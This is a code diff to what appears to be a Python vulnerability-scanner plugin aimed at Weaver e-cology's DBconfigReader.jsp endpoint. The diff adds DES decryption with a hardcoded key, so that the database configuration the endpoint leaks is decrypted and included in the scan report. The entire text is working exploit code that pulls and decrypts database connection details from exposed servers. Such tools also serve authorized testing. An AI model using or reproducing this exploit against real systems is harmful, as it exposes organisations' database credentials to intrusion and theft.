@@ -7,6 +7,7 @@ import urllib
 import requests
 import logging
 import ClassCongregation
+import pyDes
 requests.packages.urllib3.disable_warnings()
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
@@ -29,7 +30,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,ProxyIp=None):
+def medusa(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -44,7 +45,7 @@ def medusa(Url,RandomAgent,ProxyIp=None):
         payload = "/mobile/DBconfigReader.jsp"
         payload_url = scheme + "://" + url +":"+ str(port) + payload
 
-
+        key = '1z2x3c4v5b6n'[0:8]
         headers = {
             'User-Agent': RandomAgent,
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -61,14 +62,16 @@ def medusa(Url,RandomAgent,ProxyIp=None):
         elif ProxyIp==None:
             resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
         con=resp.text
+        dec=resp.content[10:]
         resph= resp.headers['Set-Cookie']
         code = resp.status_code
         if code == 200 and resp.headers['Content-Type']=='text/html; charset=UTF-8' and resph.find('ecology') != -1 and len(con)>20:
-            Medusa = "{} 验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n".format(url,payload_url,con)
+            k = pyDes.des(key, pyDes.ECB, '\0' * 8, pad=None, padmode=pyDes.PAD_PKCS5)
+            decs=k.decrypt(dec)
+            Medusa = "{} 验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
             _t=VulnerabilityInfo(Medusa)
             web=ClassCongregation.VulnerabilityDetails(_t.info)
             web.Intermediate() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-            print(_t.info)
             return (_t.info)
     except:
         logging.warning(Url)
